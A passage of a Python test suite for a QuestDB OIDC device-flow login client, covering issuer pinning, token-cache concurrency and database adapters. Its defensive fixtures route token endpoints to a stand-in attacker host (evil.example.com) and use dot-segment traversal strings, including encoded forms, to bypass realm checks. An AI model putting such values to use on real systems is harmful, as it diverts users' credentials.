             mock.patch.object(_discovery, 'discover_device_endpoint_from_idp',
                               return_value=well_known):
            with self.assertRaises(OidcConfigError) as cm:
                _discovery.resolve_config(
                    questdb_url='https://qdb.example.com:9000', issuer=issuer)
        self.assertIn('issuer', str(cm.exception).lower())

    def test_well_known_404_raises_oidc_error(self):
        # issuer pinned (so the IdP fallback is allowed), but the .well-known
        # document 404s: get_json maps the non-2xx to OidcError rather than a
        # silent miss that would later masquerade as a missing-endpoint error.
        # See M4.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token'}}
        self.state.well_known = None  # the handler returns 404 for /.well-known
        with self.assertRaises(OidcError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_from_questdb_forwards_default_interval(self):
        # from_questdb(**opts) must accept default_interval (it previously
        # raised TypeError) and reach the auth.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, default_interval=9,
            renderer=Renderer(), interactive=True, _clock=FakeClock())
        self.assertEqual(auth._default_interval, 9)


class TestInsecureSettingsGuard(unittest.TestCase):
    """
    M1: a /settings response fetched over plaintext http to a non-loopback host
    (only reachable with insecure=True) is MITM-able, so IdP endpoints it
    advertises must not be trusted to route the device code / refresh token
    without an out-of-band issuer pin — even when BOTH endpoints are present (so
    the co-location check would otherwise pass trivially).
    """

    _TAMPERED = {
        'acl.oidc.enabled': True,
        'acl.oidc.client.id': 'questdb',
        'acl.oidc.token.endpoint': 'https://evil.example.com/token',
        'acl.oidc.device.authorization.endpoint':
            'https://evil.example.com/device',
    }

    def _resolve(self, settings, **kw):
        # Stub the network: /settings returns the given (possibly tampered) map,
        # and IdP discovery must never be contacted in these guard paths.
        from questdb.auth import _discovery
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(
                 _discovery, 'discover_device_endpoint_from_idp',
                 side_effect=AssertionError('IdP discovery must not run')):
            return _discovery.resolve_config(**kw)

    def test_both_endpoints_over_plaintext_without_pin_rejected(self):
        # The M1 case: both endpoints present at one (attacker) origin, plaintext
        # channel, no pin -> refuse, and never contact the IdP.
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(self._TAMPERED,
                          questdb_url='http://qdb.internal.example:9000',
                          insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_plaintext_guard_does_not_fire_for_loopback(self):
        # Loopback http never leaves the host, so /settings is not MITM-able;
        # the guard must not fire (the common local-dev path).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://127.0.0.1:9000', insecure=True)
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_plaintext_guard_does_not_fire_over_https(self):
        # Over https /settings is authenticated by TLS; the documented
        # trust-the-server behavior is preserved (issuer= stays optional).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='https://qdb.example.com:9000')
        self.assertEqual(cfg.device_authorization_endpoint,
                         'https://evil.example.com/device')

    def test_explicit_endpoints_over_plaintext_are_trusted(self):
        # Endpoints the caller passed explicitly are not /settings-supplied, so
        # the guard must not force a pin even over a plaintext channel.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='http://qdb.internal.example:9000', insecure=True,
            token_endpoint='https://idp.example.com/token',
            device_authorization_endpoint='https://idp.example.com/device')
        self.assertEqual(cfg.token_endpoint, 'https://idp.example.com/token')

    def test_pin_satisfies_guard_over_plaintext(self):
        # With an out-of-band issuer pin the guard is satisfied (the actual
        # origin validation then happens in OidcDeviceAuth.__init__).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://qdb.internal.example:9000',
                            insecure=True, issuer='https://evil.example.com')
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_issuer_path_scopes_settings_endpoints(self):
        # M1: a tampered /settings advertising a DIFFERENT realm's endpoints on
        # the SAME host (Keycloak path-based multi-tenancy) is rejected when the
        # issuer is pinned to a specific realm — the origin check alone can't
        # catch it because both realms share one origin.
        kc = 'https://idp.example.com/realms'
        evil = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                kc + '/EVIL/protocol/openid-connect/token',
            'acl.oidc.device.authorization.endpoint':
                kc + '/EVIL/protocol/openid-connect/auth/device'}
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(evil, questdb_url='https://qdb.example.com:9000',
                          issuer=kc + '/prod')
        self.assertIn('issuer', str(cm.exception).lower())
        # The pinned realm's own endpoints are accepted.
        good = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                kc + '/prod/protocol/openid-connect/token',
            'acl.oidc.device.authorization.endpoint':
                kc + '/prod/protocol/openid-connect/auth/device'}
        cfg = self._resolve(good, questdb_url='https://qdb.example.com:9000',
                            issuer=kc + '/prod')
        self.assertEqual(cfg.token_endpoint,
                         kc + '/prod/protocol/openid-connect/token')

    def test_issuer_path_scope_skips_explicit_endpoints(self):
        # Caller-explicit endpoints are trusted and NOT path-checked, so an IdP
        # that places endpoints outside the issuer path (e.g. Azure AD) still
        # works when the endpoints are passed explicitly.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='https://qdb.example.com:9000',
            issuer='https://idp.example.com/realms/prod',
            token_endpoint='https://idp.example.com/oauth2/v2.0/token',
            device_authorization_endpoint=(
                'https://idp.example.com/oauth2/v2.0/devicecode'))
        self.assertEqual(cfg.token_endpoint,
                         'https://idp.example.com/oauth2/v2.0/token')

    def test_issuer_path_scope_rejects_dot_segment_traversal(self):
        # A tampered /settings can't slip a different realm past the issuer-path
        # scope with a '..' segment: '/realms/prod/../EVIL/...' satisfies a naive
        # prefix test but the IdP normalizes it to the EVIL realm. The dotted
        # path must be rejected (even percent-encoded). See
        # _endpoint_path_under_issuer.
        kc = 'https://idp.example.com/realms'
        for ep in (kc + '/prod/../EVIL/protocol/openid-connect',
                   kc + '/prod/%2e%2e/EVIL/protocol/openid-connect',
                   # double-encoded: a server that unescapes twice resolves the
                   # '..' the old single-decode check missed (M4).
                   kc + '/prod/%252e%252e/EVIL/protocol/openid-connect'):
            evil = {
                'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
                'acl.oidc.token.endpoint': ep + '/token',
                'acl.oidc.device.authorization.endpoint': ep + '/auth/device'}
            with self.assertRaises(OidcConfigError) as cm:
                self._resolve(evil, questdb_url='https://qdb.example.com:9000',
                              issuer=kc + '/prod')
            self.assertIn('issuer', str(cm.exception).lower())

    def test_empty_string_endpoint_override_does_not_launder_settings(self):
        # C1: an empty-string endpoint override is a common "unset" sentinel
        # (e.g. token_endpoint=os.environ.get("QDB_TOKEN_ENDPOINT", "")). It must
        # behave exactly like an OMITTED (None) override -- never be treated as
        # caller-explicit (trusted) while its VALUE is silently taken from the
        # untrusted /settings response. Were it treated as explicit, the
        # provenance flags would stamp the /settings-advertised (attacker)
        # endpoint as caller-supplied and skip BOTH the plaintext-channel guard
        # and the issuer origin/path pins, routing the device code / refresh token
        # to the attacker. resolve_config normalizes empty->None up front so this
        # can't happen.
        # Plaintext channel, no pin: the guard must still fire for any empty combo
        # (both empty, or one empty + one omitted).
        for tok, dev in (('', ''), ('', None), (None, '')):
            with self.assertRaises(OidcConfigError) as cm:
                self._resolve(self._TAMPERED,
                              questdb_url='http://qdb.internal.example:9000',
                              insecure=True,
                              token_endpoint=tok,
                              device_authorization_endpoint=dev)
            self.assertIn(
                'issuer', str(cm.exception),
                f'empty override ({tok!r}, {dev!r}) bypassed the plaintext guard')
        # https channel WITH an issuer pinned to a DIFFERENT origin: an empty
        # override must not skip the issuer-origin pin the way a genuine explicit
        # endpoint (intentionally) does -- the /settings attacker endpoints stay
        # pinned and rejected.
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(self._TAMPERED,
                          questdb_url='https://qdb.example.com:9000',
                          issuer='https://idp.good.example',
                          token_endpoint='',
                          device_authorization_endpoint='')
        self.assertIn('issuer', str(cm.exception).lower())


class TestConcurrency(AuthTestBase):
    def test_valid_cached_token_does_not_block_during_signin(self):
        # A caller with a valid cached token must NOT block behind another
        # thread's in-progress sign-in: the fast path takes no lock.
        auth = self.make_auth()
        valid = TokenSet(
            access_token='a', id_token=ID_TOKEN, refresh_token='r',
            expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)

        auth._lock.acquire()  # simulate another thread mid-sign-in
        try:
            result = {}
            t = threading.Thread(
                target=lambda: result.update(tok=auth.token()))
            t.start()
            t.join(timeout=5)
            self.assertFalse(
                t.is_alive(), 'token() blocked behind an in-progress sign-in')
            self.assertEqual(result.get('tok'), ID_TOKEN)
        finally:
            auth._lock.release()

    def test_concurrent_signin_prompts_only_once(self):
        # Two threads racing with an empty cache must trigger exactly ONE
        # device flow; the loser reuses the winner's token.
        auth = self.make_auth()
        entered = threading.Event()
        release = threading.Event()

        class GatingRenderer(Renderer):
            def on_prompt(self, resp):
                entered.set()       # first thread is now inside the flow
                release.wait(5)     # ...holding the acquisition lock

        auth._renderer = GatingRenderer()
        results = {}

        def call(name):
            try:
                results[name] = auth.token()
            except Exception as e:  # noqa: BLE001
                results[name] = e

        t1 = threading.Thread(target=call, args=('a',))
        t1.start()
        self.assertTrue(entered.wait(5))   # t1 holds the lock in the flow
        t2 = threading.Thread(target=call, args=('b',))
        t2.start()
        release.set()                      # let t1 finish signing in
        t1.join(5)
        t2.join(5)
        # Fail loudly on a deadlock regression: a hung thread would otherwise
        # leak and let the assertions below pass on a stale/half-filled dict.
        self.assertFalse(t1.is_alive(), 'sign-in thread deadlocked')
        self.assertFalse(t2.is_alive(), 'waiter thread deadlocked')
        self.assertEqual(results.get('a'), ID_TOKEN)
        self.assertEqual(results.get('b'), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # no second prompt

    def test_fast_path_does_not_write_tokens_field(self):
        # M4: the lock-free fast path must be READ-ONLY. Serving a valid token
        # from the shared cache must not write self._tokens — only the locked
        # slow path (and _store/clear) write it — so the lock-free reader can't
        # race a concurrent write (lost update / clear() resurrection).
        auth = self.make_auth()
        valid = TokenSet(access_token='a', id_token=ID_TOKEN, refresh_token='r',
                         expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)
        self.assertIsNone(auth._tokens)            # nothing published yet
        self.assertEqual(auth.token(), ID_TOKEN)   # served via the fast path
        self.assertIsNone(auth._tokens)            # fast path did not write it

    def test_clear_on_other_instance_survives_inflight_acquire(self):
        # Two OidcDeviceAuth instances share the process-global MemoryCache
        # (same cache_key) but have separate per-instance locks. If instance B
        # clears the entry while instance A's sign-in is in flight, A's store
        # must NOT resurrect it: the per-key generation A captured before its
        # round-trip no longer matches, so the write is dropped and the cache
        # stays cleared (the next fresh load re-prompts, honoring clear()). A
        # still returns the token it just acquired. See store_if_current.
        a = self.make_auth()
        b = self.make_auth()
        self.assertEqual(a.cache_key, b.cache_key)

        class _ClearMidFlow(Renderer):
            def on_prompt(self, resp):
                b.clear()                 # concurrent clear during A's sign-in

        a._renderer = _ClearMidFlow()
        self.assertEqual(a.token(), ID_TOKEN)          # A still gets its token
        # A's store was dropped, so the shared cache is NOT repopulated; a fresh
        # instance therefore re-signs in rather than reusing the cleared token.
        self.assertNotIn(a.cache_key, _MEMORY_STORE)

    def test_store_if_current_drops_write_after_concurrent_clear(self):
        # Unit cover for the CAS primitive the cross-instance guard relies on:
        # a generation captured before a clear() must not be allowed to store.
        cache = MemoryCache()
        key = 'k'
        gen = cache.generation(key)                    # captured before clear
        cache.clear(key)                               # concurrent clear
        self.assertFalse(
            cache.store_if_current(key, TokenSet(access_token='T1'), gen))
        self.assertIsNone(cache.load(key))             # write dropped
        gen2 = cache.generation(key)                   # unraced store succeeds
        self.assertTrue(
            cache.store_if_current(key, TokenSet(access_token='T2'), gen2))
        self.assertIsNotNone(cache.load(key))

    def test_evict_does_not_bump_generation_unlike_clear(self):
        # evict() drops the cached token WITHOUT bumping the clear()-generation,
        # so the SAME acquisition that evicted its own unusable token can still
        # land its replacement; clear() bumps it, so a store captured before the
        # clear is dropped. This is the distinction the refresh-then-resign path
        # relies on (_acquire evicts the doomed token, then _store the fresh one).
        cache = MemoryCache()
        key = 'k'
        gen = cache.generation(key)                    # acquisition begins
        cache.evict(key)                               # drop our own bad token
        self.assertTrue(                               # replacement still lands
            cache.store_if_current(key, TokenSet(access_token='new'), gen))
        self.assertEqual(cache.load(key).access_token, 'new')
        # Contrast: a clear() with the same in-flight generation DOES drop a
        # store captured before it.
        cache.clear(key)
        self.assertFalse(
            cache.store_if_current(key, TokenSet(access_token='x'), gen))
        cache.release(key)

    def test_generation_pruned_when_no_acquisition_in_flight(self):
        # M8: the per-key clear()-generation must not accumulate forever. After a
        # clear() and a completed re-acquisition (no acquisition left in flight),
        # neither the generation nor the in-flight bookkeeping is retained for
        # the key, so the process-global maps stay bounded.
        auth = self.make_auth()
        auth.token()                 # sign in (slow path: capture + release)
        self.assertNotIn(auth.cache_key, _MEMORY_INFLIGHT)   # released
        auth.clear()                 # no acquisition in flight -> drop, no bump
        self.assertNotIn(auth.cache_key, _MEMORY_GENERATION)
        auth.token()                 # re-acquire; release() prunes on completion
        self.assertNotIn(auth.cache_key, _MEMORY_GENERATION)
        self.assertNotIn(auth.cache_key, _MEMORY_INFLIGHT)

    def test_concurrent_clear_retains_generation_until_acquire_done(self):
        # The flip side of pruning: while an acquisition IS in flight, a
        # concurrent clear() must RETAIN the bumped generation so the in-flight
        # store_if_current is still dropped (clear() honored). The entry is
        # reclaimed only once that acquisition releases — pruning must not weaken
        # this in-flight defense. Strengthens the cross-instance clear() test.
        seen = {}
        a = self.make_auth()
        b = self.make_auth()
        self.assertEqual(a.cache_key, b.cache_key)

        class _ClearMidFlow(Renderer):
            def on_prompt(self, resp):
                b.clear()  # concurrent clear during A's in-flight sign-in
                # A is mid-acquisition, so the generation is retained here.
                seen['gen_present'] = a.cache_key in _MEMORY_GENERATION
                seen['inflight'] = _MEMORY_INFLIGHT.get(a.cache_key, 0)

        a._renderer = _ClearMidFlow()
        self.assertEqual(a.token(), ID_TOKEN)
        self.assertTrue(seen['gen_present'])             # retained during the flow
        self.assertGreaterEqual(seen['inflight'], 1)
        self.assertNotIn(a.cache_key, _MEMORY_STORE)        # A's store dropped
        self.assertNotIn(a.cache_key, _MEMORY_GENERATION)   # reclaimed on release
        self.assertNotIn(a.cache_key, _MEMORY_INFLIGHT)

    def test_renderer_reentrant_call_raises_not_deadlocks(self):
        # m3: self._lock is held across the WHOLE sign-in, including the renderer
        # callbacks. A custom renderer whose callback calls back into the SAME
        # instance (here clear()) must fail fast with a typed OidcError, not
        # deadlock on the non-reentrant lock. Run token() on a worker thread with
        # a join timeout so a regression that re-introduces the deadlock fails
        # the test instead of hanging the whole suite.
        auth = self.make_auth()
        outcome = {}

        class _Reentrant(Renderer):
            def on_prompt(self, resp):
                auth.clear()  # re-enter the same instance mid-sign-in

        auth._renderer = _Reentrant()

        def run():
            try:
                auth.token()
                outcome['result'] = 'returned'
            except OidcError as e:
                outcome['result'] = 'raised'
                outcome['err'] = e
            except BaseException as e:  # noqa: BLE001
                outcome['result'] = 'other'
                outcome['err'] = e

        t = threading.Thread(target=run)
        t.start()
        t.join(10)
        self.assertFalse(t.is_alive(), 'reentrant renderer deadlocked the lock')
        self.assertEqual(outcome.get('result'), 'raised',
                         f'expected OidcError, got {outcome!r}')
        self.assertIn('reentrant', str(outcome['err']).lower())
        # The lock owner is cleared after the aborted acquisition, so the
        # instance is left usable (no leaked owner / held lock).
        self.assertIsNone(auth._lock_owner)

    def test_token_clear_stress(self):
        # M3: drive the lock-free fast path and the generation/inflight CAS under
        # REAL thread contention. The other concurrency tests exercise the CAS
        # sequentially or via a same-thread synchronous clear(); this races many
        # token() readers against a thread that periodically clear()s, the closest
        # analogue to a SQLAlchemy/psycopg pool opening connections as the token is
        # cycled. Asserts: no thread sees an exception (torn read / CAS bug / the
        # M1 non-string crash would surface here), none deadlocks, the cache keeps
        # serving so prompts stay far below the token() call count, and the
        # process-global in-flight bookkeeping doesn't leak.
        #
        # Runs on a free-threaded (no-GIL) build too — that is where the lock-free
        # fast-path read of self._tokens is genuinely concurrent with the locked
        # writers, so the _ConcurrentClock (not the racy FakeClock) is used.
        clock = _ConcurrentClock()
        auth = self.make_auth(clock=clock, open_browser=False)
        # Seed a valid token so the steady state is the lock-free fast path; a
        # device flow then runs ONLY when a clear() has just emptied the cache.
        # The seed's id_token is DISTINCT from the one the mock mints on a device
        # flow (ID_TOKEN), so a served token distinguishes a stale cache-hit
        # (SEED_ID) from a genuine re-acquisition (ID_TOKEN) — a seed == issued
        # value would make `token() != ID_TOKEN` a tautology that a broken CAS
        # (which drops the shared-cache write) could pass unnoticed.
        SEED_ID = 'SEED-ID-TOKEN'
        self.assertNotEqual(SEED_ID, ID_TOKEN)
        seed = TokenSet(
            access_token='a', id_token=SEED_ID, refresh_token='r',
            issued_at=clock.now(), expires_at=clock.now() + 3600)
        auth._cache.store(auth.cache_key, seed)

        n_workers = 7
        iters = 200
        n_clears = 40
        errors = []
        start = threading.Barrier(n_workers + 1 + 1)  # workers + clearer + main

        def worker():
            start.wait()
            try:
                for _ in range(iters):
                    # Only the seed or the freshly-minted token are ever valid;
                    # anything else is a torn / wrong-context / CAS-corrupted read.
                    tok = auth.token()
                    if tok not in (SEED_ID, ID_TOKEN):
                        errors.append(f'unexpected token served: {tok!r}')
                        return
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        def clearer():
            start.wait()
            try:
                for _ in range(n_clears):
                    auth.clear()
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        threads = [threading.Thread(target=worker) for _ in range(n_workers)]
        threads.append(threading.Thread(target=clearer))
        for t in threads:
            t.start()
        start.wait()  # release everyone at once for maximum contention
        for t in threads:
            t.join(30)
        for t in threads:
            self.assertFalse(t.is_alive(), 'a thread deadlocked under contention')
        self.assertEqual(errors, [], f'errors under contention: {errors[:3]}')
        # A device flow runs only after a clear() empties the cache (the lock
        # serializes the re-acquisition, so racing readers reuse it) — never per
        # call. So prompts are bounded by the clears, far below n_workers*iters.
        self.assertLessEqual(self.state.device_requests, n_clears + 1)
        self.assertGreater(n_workers * iters,
                           max(1, self.state.device_requests) * 10)
        # No leaked in-flight bookkeeping once the storm settles.
        self.assertEqual(_MEMORY_INFLIGHT.get(auth.cache_key, 0), 0)
        # A final clear forces re-acquisition: the served token is now the FRESH
        # mock id_token, DISTINCT from the seed — proving a cleared entry is
        # genuinely re-acquired (not a stale seed served) and the CAS repopulated
        # the shared cache with the fresh token.
        auth.clear()
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_cross_instance_clear_stress(self):
        # M4: the single-instance stress test above cannot exercise the
        # cross-instance generation/inflight CAS — one instance's clear() and its
        # own acquisition serialize on the same self._lock. The race the CAS
        # actually guards is a clear() on ONE instance bumping the generation
        # while ANOTHER instance's store_if_current is in flight (separate locks,
        # one shared process-global store) — the SQLAlchemy/psycopg pool case.
        # Drive several instances sharing one cache_key under real contention:
        # workers acquire on every instance while a clearer clears them. Asserts
        # no torn read / exception / deadlock, every served token is the right
        # kind, the cache serves the steady state, and the process-global
        # in-flight & generation bookkeeping does not leak. (Lock order is always
        # instance-lock -> _MEMORY_LOCK on every path, so there is no inversion to
        # deadlock on.)
        clock = _ConcurrentClock()
        n_inst = 4
        insts = [self.make_auth(clock=clock, open_browser=False)
                 for _ in range(n_inst)]
        key = insts[0].cache_key
        self.assertTrue(all(a.cache_key == key for a in insts))
        # Seed the shared cache with a token whose id_token is DISTINCT from the
        # one the mock mints on a device flow (ID_TOKEN), so a served value tells
        # a stale cache-hit (SEED_ID) apart from a re-acquisition (ID_TOKEN) — the
        # seed == issued tautology would let a broken cross-instance CAS (which
        # drops the shared-cache write) pass unnoticed.
        SEED_ID = 'SEED-ID-TOKEN-XINST'
        self.assertNotEqual(SEED_ID, ID_TOKEN)
        insts[0]._cache.store(key, TokenSet(
            access_token='a', id_token=SEED_ID, refresh_token='r',
            issued_at=clock.now(), expires_at=clock.now() + 3600))

        n_workers = 6
        iters = 80
        n_clears = 40
        errors = []
        start = threading.Barrier(n_workers + 1 + 1)  # workers + clearer + main

        def worker(wid):
            start.wait()
            try:
                for i in range(iters):
                    # Only the seed or a freshly-minted token are ever valid;
                    # anything else is a torn / wrong-context / CAS-corrupted read.
                    tok = insts[(wid + i) % n_inst].token()
                    if tok not in (SEED_ID, ID_TOKEN):
                        errors.append(f'unexpected token served: {tok!r}')
                        return
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        def clearer():
            start.wait()
            try:
                for i in range(n_clears):
                    insts[i % n_inst].clear()   # clears under a DIFFERENT lock
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(w,))
                   for w in range(n_workers)]
        threads.append(threading.Thread(target=clearer))
        for t in threads:
            t.start()
        start.wait()   # release everyone at once for maximum contention
        for t in threads:
            t.join(30)
        for t in threads:
            self.assertFalse(t.is_alive(), 'a thread deadlocked under contention')
        self.assertEqual(errors, [], f'errors under contention: {errors[:3]}')
        # The shared cache + each instance's fast path serve the steady state, so
        # device flows stay far below the total token() calls. (Cross-instance CAN
        # double-prompt across separate locks, so this is looser than the
        # single-instance "exactly once".)
        self.assertLess(self.state.device_requests, n_workers * iters // 2)
        # No leaked process-global bookkeeping once the storm settles.
        self.assertEqual(_MEMORY_INFLIGHT.get(key, 0), 0)
        self.assertNotIn(key, _MEMORY_GENERATION)
        # A final clear forces re-acquisition: the served token is now the FRESH
        # mock id_token, DISTINCT from the seed — proving a cleared entry is
        # re-acquired across instances (not a stale seed served).
        insts[0].clear()
        self.assertEqual(insts[0].token(), ID_TOKEN)

    def test_stale_local_token_adopts_fresh_shared_cache_token(self):
        # m1: when this instance holds a STALE (non-None, expired) self._tokens
        # while ANOTHER instance sharing the process-global cache has stored a
        # fresh valid token, the slow path must adopt the cached fresh token
        # rather than run a redundant refresh / sign-in. (Before the fix the
        # promotion reloaded the shared cache only when self._tokens was None, so
        # a stale local token shadowed the fresher cached one.)
        clock = FakeClock()
        a = self.make_auth(clock=clock)
        b = self.make_auth(clock=clock)
        self.assertEqual(a.cache_key, b.cache_key)
        now = clock.now()
        # a has a stale local token (with a refresh_token it would otherwise use):
        a._tokens = TokenSet(
            access_token='old', id_token='old-id', refresh_token='r-old',
            expires_at=now - 10)
        # b stored a fresh valid token in the shared cache meanwhile:
        b._cache.store(b.cache_key, TokenSet(
            access_token='fresh-access', id_token=ID_TOKEN,
            refresh_token='r-new', issued_at=now, expires_at=now + 3600))
        # a.token() adopts the fresh cached token: no refresh, no device flow.
        self.assertEqual(a.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 0)
        self.assertEqual(self.state.device_requests, 0)

    def test_promoted_cache_token_syncs_last_persisted_marker(self):
        # m1: adopting a fresh token from the shared cache (a peer refreshed and
        # ROTATED the refresh token) must also advance this instance's
        # _last_persisted_refresh_token marker, exactly as _adopt does for a disk
        # load. Otherwise a later coordinated refresh reads the stale marker: its
        # `refresh_token == _last_persisted_refresh_token` gate wrongly concludes
        # "our save failed, in-memory is newer than disk", skips the token-store
        # re-read, and refreshes the peer-rotated (now revoked) token — forcing a
        # needless re-prompt while the peer's valid refresh token sits on disk.
        clock = FakeClock()
        a = self.make_auth(clock=clock)
        b = self.make_auth(clock=clock)
        self.assertEqual(a.cache_key, b.cache_key)
        now = clock.now()
        # a last saw 'r-old' as persisted (e.g. from its own earlier sign-in) and
        # now holds a stale local token still carrying it:
        a._tokens = TokenSet(
            access_token='old', id_token='old-id', refresh_token='r-old',
            expires_at=now - 10)
        a._last_persisted_refresh_token = 'r-old'
        # b refreshed and rotated the refresh token into the shared cache:
        b._cache.store(b.cache_key, TokenSet(
            access_token='fresh-access', id_token=ID_TOKEN,
            refresh_token='r-new', issued_at=now, expires_at=now + 3600))
        # a.token() promotes the fresh cached token (no refresh / sign-in)...
        self.assertEqual(a.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 0)
        self.assertEqual(self.state.device_requests, 0)
        # ...and the persisted marker now tracks the ADOPTED refresh token, so a
        # later _refresh_under_lock re-reads the store instead of replaying the
        # revoked 'r-old'.
        self.assertEqual(a._last_persisted_refresh_token, 'r-new')

    def test_peer_token_adopted_after_failed_refresh_avoids_reprompt(self):
        # M2: OUR refresh_token is proven useless (rejected), but a peer instance
        # sharing the process-global cache stored a VALID token for this identity
        # while our refresh was in flight. _acquire must adopt and return that
        # peer token rather than evict it and run a needless interactive device
        # flow. (Before the fix _acquire dropped straight to the device flow,
        # evicting the peer's fresh token and re-prompting the user.)
        clock = FakeClock()
        a = self.make_auth(clock=clock)
        b = self.make_auth(clock=clock)
        self.assertEqual(a.cache_key, b.cache_key)
        now = clock.now()
        # a holds a stale local token; the shared cache is empty, so a proceeds
        # past the _obtain_tokens promotion into _acquire, where its refresh runs.
        a._tokens = TokenSet(
            access_token='old', id_token='old-id', refresh_token='r-old',
            expires_at=now - 10)
        peer_tok = TokenSet(
            access_token='peer-access', id_token=ID_TOKEN,
            refresh_token='r-new', issued_at=now, expires_at=now + 3600)

        # Model the race deterministically: a's coordinated refresh fails (our
        # token is rejected), and while it is "in flight" a peer stores a valid
        # token into the shared cache.
        def failed_refresh(tokens, generation):
            b._cache.store(b.cache_key, peer_tok)
            return None

        a._try_refresh_coordinated = failed_refresh
        self.assertEqual(a.token(), ID_TOKEN)
        # No interactive device flow ran: the peer token was adopted, not evicted.
        self.assertEqual(self.state.device_requests, 0)
        # The peer token remains in the shared cache (a did not evict it).
        cached = a._cache.load(a.cache_key)
        self.assertIsNotNone(cached)
        self.assertEqual(cached.id_token, ID_TOKEN)
        self.assertEqual(cached.refresh_token, 'r-new')
        # The adopted refresh token is tracked so a later coordinated refresh
        # doesn't misread it as newer-than-disk (mirrors the promotion path).
        self.assertEqual(a._last_persisted_refresh_token, 'r-new')


class TestAdapters(unittest.TestCase):
    """PG-wire connection adapters: tested via injected fake modules (the real
    sqlalchemy / psycopg need not be installed)."""

    def test_psycopg_connect_as_sso_with_token(self):
        auth = _FakeAuth('TKN')
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            conn = psycopg_connect(
                auth, 'http://db.example.com:9000', connect_timeout=3)
        self.assertEqual(conn, 'CONN')
        self.assertEqual(captured['user'], '_sso')
        self.assertEqual(captured['password'], 'TKN')
        self.assertEqual(captured['host'], 'db.example.com')
        self.assertEqual(captured['port'], 8812)
        self.assertEqual(captured['dbname'], 'qdb')
        self.assertEqual(captured['connect_timeout'], 3)
        # The token is fetched at connect time (fresh per connection).
        self.assertEqual(auth.calls, 1)

    def test_psycopg_connect_uses_bare_ipv6_host(self):
        # psycopg takes host and port separately, so the IPv6 host is passed
        # WITHOUT brackets.
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            psycopg_connect(_FakeAuth(), 'http://[::1]:9000')
        self.assertEqual(captured['host'], '::1')

    def test_sqlalchemy_engine_injects_fresh_token_per_connect(self):
        auth = _FakeAuth('TKN')
        created = {}
        events = {}
        engine_obj = object()

        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []

        def create_engine(url, **kw):
            created.update(url=url, engine_kw=kw)
            return engine_obj

        class _Event:
            @staticmethod
            def listens_for(target, name):
                def deco(fn):
                    events.update(name=name, fn=fn)
                    return fn
                return deco

        fake_sa.create_engine = create_engine
        fake_sa.event = _Event

        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        fake_pg = types.ModuleType('psycopg')  # drives the drivername choice

        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': fake_pg}):
            engine = sqlalchemy_engine(
                auth, 'http://db.example.com:9000', pool_pre_ping=True)

        self.assertIs(engine, engine_obj)
        self.assertEqual(created['drivername'], 'postgresql+psycopg')
        self.assertEqual(created['username'], '_sso')
        self.assertEqual(created['host'], 'db.example.com')
        self.assertEqual(created['port'], 8812)
        self.assertEqual(created['database'], 'qdb')
        self.assertEqual(created['url'], 'URL')
        self.assertEqual(created['engine_kw'], {'pool_pre_ping': True})
        self.assertEqual(events['name'], 'do_connect')
        # The listener injects a fresh token on each new connection.
        before = auth.calls
        for _ in range(2):
            cparams = {}
            events['fn'](None, None, [], cparams)
            self.assertEqual(cparams['password'], 'TKN')
        self.assertEqual(auth.calls - before, 2)
        # ...and it fetches NON-interactively (via _token(allow_interactive=
        # False), not token()): a regression to the interactive accessor would
        # leave last_allow_interactive at None / True and fail here. See also
        # test_sqlalchemy_engine_per_connect_refuses_interactive_signin.
        self.assertIs(auth.last_allow_interactive, False)

    def test_sqlalchemy_engine_per_connect_refuses_interactive_signin(self):
        # The per-connection token injection MUST be non-interactive: it runs on
        # a pool thread, where launching a device-flow browser prompt would block
        # the pool. The adapter fetches via auth._token(allow_interactive=False),
        # so when no token has been acquired yet the pool sees OidcInteraction-
        # Required rather than a hung prompt. Drive the real do_connect listener
